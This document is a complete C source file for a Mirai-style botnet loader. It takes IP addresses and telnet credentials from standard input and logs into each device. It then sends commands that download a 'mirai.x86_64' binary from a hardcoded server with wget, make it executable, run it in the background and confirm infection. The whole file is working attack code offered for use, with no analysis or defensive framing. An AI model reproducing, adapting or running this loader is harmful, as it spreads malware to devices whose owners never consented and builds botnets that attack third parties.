/**
 * Simple Loader v5 - With proper delays and verification
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <time.h>

#define BUFFER_SIZE 4096
#define TIMEOUT 30
#define HTTP_SERVER "172.16.193.190"

int recv_with_timeout(int fd, char *buf, int size, int timeout_sec) {
    fd_set fds;
    struct timeval tv;
    int ret;
    
    FD_ZERO(&fds);
    FD_SET(fd, &fds);
    tv.tv_sec = timeout_sec;
    tv.tv_usec = 0;
    
    ret = select(fd + 1, &fds, NULL, NULL, &tv);
    if (ret <= 0) return -1;
    
    return recv(fd, buf, size, 0);
}

void strip_telnet_iac(char *buf, int *len) {
    int i = 0, j = 0;
    unsigned char *p = (unsigned char *)buf;
    
    while (i < *len) {
        if (p[i] == 0xFF) {
            i += 3;
        } else {
            buf[j++] = p[i++];
        }
    }
    *len = j;
    buf[j] = '\0';
}

int telnet_login(int fd, char *user, char *pass) {
    char buf[BUFFER_SIZE];
    int n;
    time_t start;
    
    // Wait for login prompt
    start = time(NULL);
    while (time(NULL) - start < TIMEOUT) {
        n = recv_with_timeout(fd, buf, sizeof(buf)-1, 2);
        if (n > 0) {
            strip_telnet_iac(buf, &n);
            if (strstr(buf, "login:")) break;
        }
    }
    
    // Send username
    snprintf(buf, sizeof(buf), "%s\r\n", user);
    send(fd, buf, strlen(buf), 0);
    usleep(500000);
    
    // Wait for password prompt
    start = time(NULL);
    while (time(NULL) - start < TIMEOUT) {
        n = recv_with_timeout(fd, buf, sizeof(buf)-1, 2);
        if (n > 0) {
            strip_telnet_iac(buf, &n);
            if (strstr(buf, "Password:")) break;
        }
    }
    
    // Send password
    snprintf(buf, sizeof(buf), "%s\r\n", pass);
    send(fd, buf, strlen(buf), 0);
    usleep(500000);
    
    // Wait for shell prompt
    start = time(NULL);
    while (time(NULL) - start < TIMEOUT) {
        n = recv_with_timeout(fd, buf, sizeof(buf)-1, 2);
        if (n > 0) {
            strip_telnet_iac(buf, &n);
            if (strstr(buf, "#") || strstr(buf, "$") || strstr(buf, "Welcome")) {
                return 1;
            }
        }
    }
    
    return 0;
}

void send_command(int fd, char *cmd, int delay_ms) {
    char buf[BUFFER_SIZE];
    snprintf(buf, sizeof(buf), "%s\r\n", cmd);
    send(fd, buf, strlen(buf), 0);
    printf("    [CMD] %s\n", cmd);
    usleep(delay_ms * 1000);
}

int main(int argc, char *argv[]) {
    char line[BUFFER_SIZE];
    int sock;
    struct sockaddr_in addr;
    int total = 0, success = 0;
    char response[BUFFER_SIZE];
    int n;
    
    printf("\n");
    printf("========================================\n");
    printf("  Simple Loader v5 - Fixed Delays\n");
    printf("========================================\n");
    printf("HTTP Server: %s\n", HTTP_SERVER);
    printf("========================================\n\n");
    
    while (fgets(line, sizeof(line), stdin)) {
        char ip[16], user[32], pass[32], arch[16];
        int port;
        
        if (sscanf(line, "%15[^:]:%d %31[^:]:%31s %15s", ip, &port, user, pass, arch) >= 4) {
            total++;
            printf("\n[%d] Trying %s:%d [%s:%s]...\n", total, ip, port, user, pass);
            
            sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) continue;
            
            addr.sin_family = AF_INET;
            addr.sin_port = htons(port);
            inet_pton(AF_INET, ip, &addr.sin_addr);
            
            if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
                printf("    Connection failed\n");
                close(sock);
                continue;
            }
            
            if (telnet_login(sock, user, pass)) {
                success++;
                printf("    [+] Logged in! Deploying bot...\n");
                
                // Download and execute bot with proper delays
                send_command(sock, "cd /tmp", 500);
                send_command(sock, "wget http://" HTTP_SERVER "/bins/mirai.x86_64 -O /tmp/bot 2>&1", 3000);
                send_command(sock, "chmod 755 /tmp/bot", 500);
                send_command(sock, "ls -la /tmp/bot", 500);
                send_command(sock, "/tmp/bot > /tmp/bot.log 2>&1 &", 1000);
                send_command(sock, "sleep 2", 2000);
                send_command(sock, "ps aux | grep bot | grep -v grep", 500);
                
                // Check response
                n = recv_with_timeout(sock, response, sizeof(response)-1, 3);
                if (n > 0) {
                    strip_telnet_iac(response, &n);
                    if (strstr(response, "bot")) {
                        printf("    [+] Bot is running on %s!\n", ip);
                    } else {
                        printf("    [!] Bot may not be running. Response: %s\n", response);
                    }
                } else {
                    printf("    [!] No response from bot check\n");
                }
                
                printf("    [+] Infection complete!\n");
            } else {
                printf("    [-] Login failed\n");
            }
            
            close(sock);
            usleep(1000000);
        }
    }
    
    printf("\n========================================\n");
    printf("  Total: %d, Successful: %d\n", total, success);
    printf("========================================\n");
    
    return 0;
}
